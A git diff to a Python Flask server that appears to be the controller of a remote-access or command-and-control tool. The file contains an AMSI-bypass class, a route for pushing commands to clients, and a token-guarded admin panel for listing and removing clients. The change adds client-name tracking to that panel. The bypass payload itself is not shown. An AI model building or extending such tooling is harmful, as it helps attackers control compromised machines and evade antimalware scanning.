@@ -100,6 +100,10 @@ class AmsiBypass:
 
 ##### AMSI BYPASS
 
+def get_status():
+    with open("./names/names.txt",'r') as file:
+        data = file.read().split("\n")
+    return data
 
 def create_csv():
     with open('id_and_commands.csv', mode='w') as csv_file:
@@ -322,6 +326,13 @@ def get_id():
         id += 1
     with open("id.txt","w") as file:
         file.write(str(id))
+    if request.args.get("name"):
+        name=request.args.get("name")
+        with open(f"./names/names.txt","r") as file:
+            data=file.read()
+        if str(id) not in data:
+            with open(f"./names/names.txt","a") as file:
+                file.write(f'{id} {name}\n')
     remove_doublons()
     return str(id)
 
@@ -371,14 +382,23 @@ def push_command():
 
 @app.route(f'/get_all_clients/{admin_token}',methods=["GET","POST"])
 def get_all():
+    content=get_id_command()
+    status = get_status()
+    lst_status = [i[0] for i in content]
+    for i in status:
+        if i.split(" ")[0] in lst_status:
+            index_lst = lst_status.index(i.split(" ")[0])
+            content[index_lst][2] = i.split(" ")[1]
+
+
     if request.cookies.get("id"):
         global admin_cookie
         if request.cookies.get("id")!=admin_cookie:
-            return render_template("interact.html",content=get_id_command(),error_code="Invalid Cookie, Log in")
+            return render_template("interact.html",content=content,error_code="Invalid Cookie, Log in")
         if request.method == "POST":
             id = request.values.get('id-text')
             if id=="" or id==" ":
-                return render_template("interact.html",content=get_id_command(),error_code="Enter an ID !")
+                return render_template("interact.html",content=content,error_code="Enter an ID !")
             try:
                 if remove_one(id):
                     code = "Done, client removed !"
@@ -386,11 +406,11 @@ def get_all():
                     code = "Unable to locate the client !"
             except:
                 code = "Error, unable to remove the client !"
-            return render_template("interact.html",content=get_id_command(),error_code=code)
+            return render_template("interact.html",content=content,error_code=code)
         else:
             if request.args.get('password'):
                 if request.args.get('password') == admin_password:
-                    return render_template("interact.html",content=get_id_command())
+                    return render_template("interact.html",content=content)
                 #return "".join([f"<label>{i[0]}</label><label> {i[1]}</label><label> {i[2]}</label><br/>" for i in get_id_command()])
                 else:
                     return render_template("interact.html",content="",error_code="Wrong Password")
